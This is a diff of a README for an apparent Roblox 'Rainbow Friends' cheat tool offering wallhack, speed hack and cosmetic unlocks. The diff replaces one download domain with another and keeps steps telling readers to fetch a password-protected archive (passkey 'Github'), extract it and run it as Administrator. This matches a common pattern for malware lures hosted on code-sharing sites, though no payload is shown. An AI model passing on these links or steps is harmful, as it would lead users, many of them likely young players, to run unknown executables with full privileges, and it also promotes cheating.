@@ -6,7 +6,7 @@ Rainbow Friends utility with ESP wallhack, speed hack, no sound, and unlock all 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -69,7 +69,7 @@ This tool provides ESP, speed hack, no sound, and cosmetic unlocks to enhance yo
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch Roblox and join Rainbow Friends.
 4. Run the tool **as Administrator**.
